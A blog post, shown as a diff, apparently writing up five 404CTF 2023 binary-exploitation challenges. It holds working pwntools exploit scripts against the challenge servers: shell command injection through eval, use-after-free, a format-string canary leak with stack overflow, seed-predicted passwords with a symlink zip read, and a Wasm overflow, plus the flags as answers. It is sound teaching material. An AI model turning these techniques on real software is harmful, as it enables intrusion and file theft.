@@ -1,0 +1,398 @@
+---
+layout: "@layouts/blog/Layout.astro"
+title: "404CTF Writeup - Binary Exploitation"
+description: "404CTF Challenges in the Binary exploitation category."
+author: "Majed Abdennadher"
+timestamp: 1690614118981
+duration: 10
+tag: "404CTF"
+slug: "binary"
+language: "english"
+image: "/static/media/404ctf/event_logo.png"
+keywords:
+  ["Cybersecurity", "404CTF", "Cryptography"]
+links: ["crypto", "web", "stegano"]
+---
+
+### Je veux la lune !
+
+We look at the contents of the `donne_moi_la_lune.sh` file supplied with the challenge to find a vulnerable line. And we find one:
+
+```bash
+eval "grep -wie ^$personne informations.txt"
+```
+
+En regardant la manpage de grep, on comprend la commande:
+
+- `-w`: Ce paramètre indique à grep de ne rechercher que les mots entiers qui correspondent exactement au motif. Par exemple, si le motif est "cat", grep ne recherchera que "cat" et non "catapult".
+- `-i`: Cette option indique à grep d'effectuer une recherche insensible à la casse. Par exemple, si le motif est "Cat", grep recherchera aussi bien "cat" que "Cat".
+- `e`: Cette option indique à grep d'utiliser l'argument suivant comme motif de recherche.
+
+The challenge also indicates that the flag exists in a file called `lune.txt`.
+
+To get the script, we provide the response `.* lune.txt` so the command `grep -wie ^.* lune.txt informations.txt` will be executed to display all the contents of these two files:
+
+```
+lune.txt:404CTF{70n_C0EuR_v4_7e_1Ach3R_C41uS}
+informations.txt:Caligula, tu es le PDG de Imperium Romanum Enterprises, tu devrais le savoir...
+...
+```
+
+As you can see, the flag is `404CTF{70n_C0EuR_v4_7e_1Ach3R_C41uS}`.
+
+### L'Alchimiste
+
+The aim of this challenge is to abuse the heap's vulnerabilities. It's not something I'd consider very simple for a first challenge, but let's get on with it.
+
+I used `ghidra` to disassemble the binary provided. Here are the rules of the game:
+- You can buy a strength potion, which costs 32 gold, and you start with 100 gold.
+- To get the flag, you need not only 150 strength, but also 150 intelligence.
+- You can talk to the alchemist (and apparently nothing happens).
+- There's a lot more information in the binary, but we're going to look at the vulnerabilities that will allow us to get the flag.
+
+#### 150 Strength
+
+This is the function that will be called up when you choose to buy a strength potion:
+
+![](/static/media/404ctf/alchemist-1.png)
+
+I've defined a few structures to make the code a little easier to read but I'm still a ghidra noob and to clarify line 14, it's actually `exilir->callback = incStr`.
+
+When using elixir, the following function is called:
+
+![](/static/media/404ctf/alchemist-2.png)
+
+One thing you notice here is that the verification of how much gold you have is done after the elixir has been set up, which means we can abuse the `use-after-free` vulnerability to get 150 strength.
+
+**Note that we cannot use the elixir after it has been released because the program is compiled to detect "double releases". So we'll have to buy an elixir and receive the failure message. But that is no problem.**
+
+Here is a script to get this far:
+
+```python
+from pwn import *
+
+def send_and_get_reply(r, bytes):
+  r.send(bytes)
+  print(r.recvuntil(b">>>").decode())
+
+def talk_to_the_alchemist(r, messageBytes):
+  r.send(b"3\n")
+  print(r.recvuntil(b":").decode())
+  send_and_get_reply(r, messageBytes)
+
+def get_flag(r):
+  r.send(b"5\n")
+  print(r.recvuntil(b"}"))
+
+r = remote('challenges.404ctf.fr', 30944)
+print(r.recvuntil(b">>>").decode())
+
+# We start with 100 force
+# Abuse "use-after-free" to get 150 force
+for i in range(5):
+  send_and_get_reply(r, b"1\n")
+  send_and_get_reply(r, b"2\n")
+
+# Show stats
+send_and_get_reply(r, b"4\n")
+```
+
+#### 150 Intelligence
+
+This is the function that is called up when we talk to the alchemist:
+
+![](/static/media/404ctf/alchemist-3.png)
+
+Observe how the exilir data structure is 0x48 (upper goes too), the same size as the message that is mallocated. We're going to send a message to the alchemist after the exilir has been released.
+
+Since the program doesn't reset the pointer to the exilir, we have some control over the callback function that will be called when the exilir is used.
+
+Conveniently enough, we see a function called `intInt` in ghidra.
+If we're lucky and the program doesn't activate ASLR, we should be able to use its address directly.
+
+Here is the script for this part:
+
+```python
+payload = (b'A' * 0x40) + b'\xd5\x08\x40\x00'
+
+print("+10 Int payload:", payload)
+talk_to_the_alchemist(r, payload)
+
+send_and_get_reply(r, b"2\n")
+send_and_get_reply(r, b"4\n")
+
+# It works ! continue abusing "use-after-free" to 150 int
+
+for i in range(9):
+  talk_to_the_alchemist(r, payload)
+  send_and_get_reply(r, b"2\n")
+	
+# Now we should be able to get the flag
+
+get_flag(r)
+#  [Alchimiste] : Voici la clé de la connaissance, comme promis.
+# -----------------------------------------------
+```
+
+And the flag was: <span class="break-words">`404CTF{P0UrQU01_P4Y3r_QU4ND_135_M075_5UFF153N7}`</span>
+
+### La Cohue
+
+This CTF challenge revolves around exploiting a buffer overflow vulnerability to gain control over a function that will read the flag. The stack frame is protected by a canary, adding an extra layer of protection that we need to bypass.
+Several methods exist to achieve this, including:
+1. controlling a pointer to override the return address
+2. leveraging a data leak vulnerability to scan the stack and read the canary.
+
+Upon looking at the disassembly in `ghidra`, I realised the program had a format string vulnerability.
+Additionally, I took note of the following information:
+- the offset to the canary
+- the address of the flag reading function
+- to ensure proper alignment, consider the padding required to align the pointer the flag function to a quad boundary
+
+Here is a script that puts all this information together:
+```python
+from pwn import *
+
+def prompt(p):
+  prompt = p.recvuntil(b">>>")
+  print(prompt.decode())
+
+def dialog(p):
+  dialog = p.recvuntil(b"[Vous] : ")
+  print(dialog.decode())
+
+# p = process('./la_cohue')
+p = remote("challenges.404ctf.fr", 30223)
+prompt(p)
+# Talk with francis
+p.send(b"2\n")
+# Read the canary
+p.send(b"%17$llx\n")
+dialog(p)
+canary_hex = p.recvuntil(b"\n")
+# Convert to bytes, little endian
+canary = int(canary_hex, 16).to_bytes(8, "little")
+padding = (0).to_bytes(8, "little")
+flag_fn = (0x00400877).to_bytes(4, "little")
+print(f"{canary_hex=} {canary=} {padding=} {flag_fn=}")
+prompt(p)
+p.send(b"1\n")
+dialog(p)
+# Exploit the buffer overflow
+payload = b'a' * 0x48 + canary + padding + flag_fn + b'\n'
+p.send(payload)
+prompt(p)
+# Get the flag
+p.send(b"3\n")
+# Francis: Je vous suis infiniment reconnaissant d'avoir retrouvé mon canari 
+print(p.recvuntil(b"\n"))
+
+# Try reading until a linebreak or as long as possible
+try:
+  print(p.recvuntil(b"\n"))
+except:
+  print(p.recv())
+```
+
+And the flag is: <span class="break-words">`404CTF{135_C4N4r15_41M3N7_14_C0MP46N13_N3_135_141553Z_P45_53U15}`</span>.
+
+### Cache cache le retour
+
+In this challenge, we encounter a multi-layered task that requires exploiting several vulnerabilities to read the flag.
+
+The author provides a crucial tip:
+> Don't come empty-handed. And don't forget to take a look in the salle_au_tresor (treasure room) when you drop off your gift. You might find something interesting!
+
+#### Attending the party
+
+To gain access to the party, participants must provide the guards with the correct password. Analyzing the binary reveals that the password is generated randomly each time the program runs, using the current time in seconds since the epoch as a seed.
+
+Here is the code generating the random password:
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <time.h>
+#include <string.h>
+
+int pick_index(int length) {
+  int result;
+
+  do {
+    result = rand();
+    result = result / (int)(0x7fffffff / (long)(length + 1));
+  } while (length < result);
+  return result;
+}
+
+char pick_char(char* charset) {
+  int index;
+  size_t length;
+
+  length = strlen(charset);
+  index = pick_index((int)length + -1);
+  return charset[index];
+}
+
+int main() {
+  int seed = time(NULL);
+  char* charsets[4];
+  char passphrase[0x14] = { 0 };
+
+  charsets[0] = "1234567890";
+  charsets[1] = "abcdefghijklmnoqprstuvwyzx";
+  charsets[2] = "ABCDEFGHIJKLMNOPQRSTUYWVZX";
+  charsets[3] = "!@#$%^&*(){}[]:<>?,./";
+
+  srand(seed);
+
+  int passphrase_length = 0x14;
+  int ncharsets = 4;
+  for ( ; passphrase_length != 0; passphrase_length-- ) {
+    int charset_pick = pick_index(ncharsets - 1);
+    char char_pick = pick_char(charsets[charset_pick]);
+    strncat(passphrase, &char_pick, 1);
+  }
+
+  printf("%s\n", passphrase);
+  return 0;
+}
+```
+
+One thing to keep in mind is that computers are deterministic machines where randomness emerges from a chaotic equation. So even a small change in the initial condition can lead to a significant variation in the output
+
+So running this extracted program at the same time (window of 1s) as the server running the challenge, I should be able to generate the same password and access the party.
+
+#### Leaving a gift
+
+Continuing reading the disassembly of the program, we see that the challenge program:
+1. Accepts a string
+2. Decodes in base64 
+3. Save the result into a `mystere.zip` file
+4. Unzip `mystere.zip` and expects a `surprise.txt` file
+5. Read the `surprise.txt` file
+
+Inside the `mystere.zip` file, we can make a symlink called `surprise.txt` that points to any file we want, for example the file containing the flag, called `salle_au_tresor`, and have the challenge read it out for us.
+This is the attack strategy.
+
+There is how we create the symlink:
+```sh
+ln -s salle_au_tresor surprise.txt
+# Keep the symlink: Do not include the pointed file on our local disk
+zip -y mystere.zip surprise.txt
+base64 mystere.zip
+#UEsDBAoAAAAAAAUFvlaLoRhuDwAAAA8AAAAMABwAc3VycHJpc2UudHh0VVQJAAPJKXVkySl1ZHV4CwABBOgDAAAE6AMAAHNhbGxlX2F1X3RyZXNvclBLAQIeAwoAAAAAAAUFvlaLoRhuDwAAAA.....
+```
+
+#### Putting it all together
+
+```python
+from pwn import *
+import sys
+import subprocess
+
+mystere = b"UEsDBAoAAAAAAAUFvlaLoRhuDwAAAA8AAAAMABwAc3VycHJpc2UudHh0VVQJAAPJKXVkySl1ZHV4CwABBOgDAAAE6AMAAHNhbGxlX2F1X3RyZXNvclBLAQIeAwoAAAAAAAUFvlaLoRhuDwAAAA8AAAAMABgAAAAAAAAAAAD/oQAAAABzdXJwcmlzZS50eHRVVAUAA8kpdWR1eAsAAQToAwAABOgDAABQSwUGAAAAAAEAAQBSAAAAVQAAAAAA"
+def getline(p):
+  dialog = p.recvuntil(b"\n")
+  print(dialog.decode())
+
+# p = process('cache_cache_le_retour')
+p = remote("challenges.404ctf.fr", 31725)
+getline(p)
+# generate the password at the same time
+guess = subprocess.check_output(['./cache_cache_timer'])
+getline(p)
+p.send(guess)
+# Receive guard instructions
+getline(p)
+getline(p)
+getline(p)
+# Send the payload
+p.send(mystere + b"\n")
+
+
+# Try reading until a linebreak or as long as possible
+try:
+  print(p.recvuntil(b"\n"))
+except:
+  print(p.recv())
+```
+
+And the flag was unveiled: <span class="break-words">`404CTF{UN_CH3V41_D3_7r013_P0Ur_3NV4H1r_14_54113_4U_7r350r}`</span>
+
+### Tour de magie
+
+The challenge is presented as a Wasm binary for which we have the source code. Apart from the fact that it's a Wasm binary, it's a classic buffer overflow attack.
+
+This is the source code for the wasm binary:
+
+```c
+#include<stdlib.h>
+#include<stdio.h>
+
+int main() {
+  int* check = malloc(sizeof(int));
+  *check = 0xcb0fcb0f;
+  printf("%xAlors, t'es un magicien ?\n", check);
+  char input[20];
+  fgets(input, 200, stdin);
+  if(*check == 0xcb0fcb0f) {
+    puts("Apparemment non...");
+    exit(0);
+  }
+  if(*check != 0xcb0fcb0f && *check != 0x50bada55) {
+    puts("Pas mal, mais il en faut plus pour m'impressionner !");
+    exit(0);
+  }
+  if(*check == 0x50bada55) {
+    puts("Wow ! Respect ! Quelles paroles enchantantes ! Voilà ta récompense...");
+    FILE* f = fopen("flag.txt", "r");
+    if(f == NULL) {
+      puts("Erreur lors de l'ouverture du flag, contactez un administrateur !");
+      exit(1);
+    }
+    char c;
+    while((c = fgetc(f)) != -1) {
+      putchar(c);
+    }
+    fclose(f);
+  }
+}
+```
+
+And here is my solution, the idea is the write `magic` into the buffer and modify the `check` to point to my buffer:
+
+```python
+from pwn import *
+
+def getline(p):
+  dialog = p.recvuntil(b"\n")
+  print(dialog.decode())
+  return dialog.decode()
+
+p = remote("challenges.404ctf.fr", 30274)
+# p = process(["./wasmtime", "main.wasm"])
+response = getline(p)
+address, message = response[:5], response[5:]
+address = int(address, 16) #seems to always be 0x11a20
+
+magic = b'\x55\xda\xba\x50'
+#        |------buffer----| |--------overflow: compute the address of this buffer---------|
+payload = magic + b'0' * 16 + b'\x00\x00\x00\x00' + (address - 0x30).to_bytes(4, "little") + b'\n'
+
+p.send(payload)
+print(getline(p))
+print(getline(p))
+```
+
+There are many other solutions, for example a specific vulnerability is that Wasm's memory functions as a continuous zone with no permissions (read, write, execute), as in a conventional ELF binary, for example.
+This lack of separation between memory zones and the absence of permissions means that in a Wasm binary, the contents of the heap can be rewritten from the stack, which is impossible in an ELF binary.
+
+Which means you can't overflow from the stack and reach the heap if I understood correctly. The author's solution uses this payload instead:
+
+```python
+payload = b"A" * 24 + p32(0x00011a20) + b"A" * 20 + p32(0x50bada55) + b'\n'
+```
+
+Check the [Official solution](https://github.com/HackademINT/404CTF-2023/tree/main/ExploitationDeBinaires/UnTourDeMagie).
+
